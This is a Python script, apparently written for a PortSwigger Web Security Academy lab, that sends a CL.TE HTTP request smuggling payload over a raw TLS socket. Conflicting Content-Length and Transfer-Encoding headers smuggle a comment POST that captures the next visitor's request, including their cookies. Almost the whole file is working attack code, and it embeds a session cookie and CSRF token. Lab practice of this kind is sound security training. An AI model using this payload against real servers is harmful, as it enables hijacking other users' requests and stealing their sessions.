import socket
import ssl
import re

host = '0ac8001903c65ba48175616600af007b.web-security-academy.net'
port = 443

# Smuggling payload (CL.TE)
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: 0a18003a0499b40c80640dda00fa00c8.web-security-academy.net\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 275\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "POST /post/comment HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 960\r\n"
    "Cookie: session=3xvf74S0IRQP2ZrXlQ8umrMdAGwbNvK6\r\n"
    "\r\n"
    "csrf=6B0xrQ8hTNLOZk4YMlG70rPd2LLsjMKf&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=Comment+3"
)

# body = (
#     "POST /post/comment HTTP/1.1\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 900\r\n"
#     "Cookie: session=3xvf74S0IRQP2ZrXlQ8umrMdAGwbNvK6\r\n"
#     "\r\n"
#     "csrf=6B0xrQ8hTNLOZk4YMlG70rPd2LLsjMKf&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=Comment+2"
# )
# print(len(body)) #275

# Brute Content-Length: X (Line 20) -> 960

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending smuggling payload...")
send_raw_https(host, port, payload)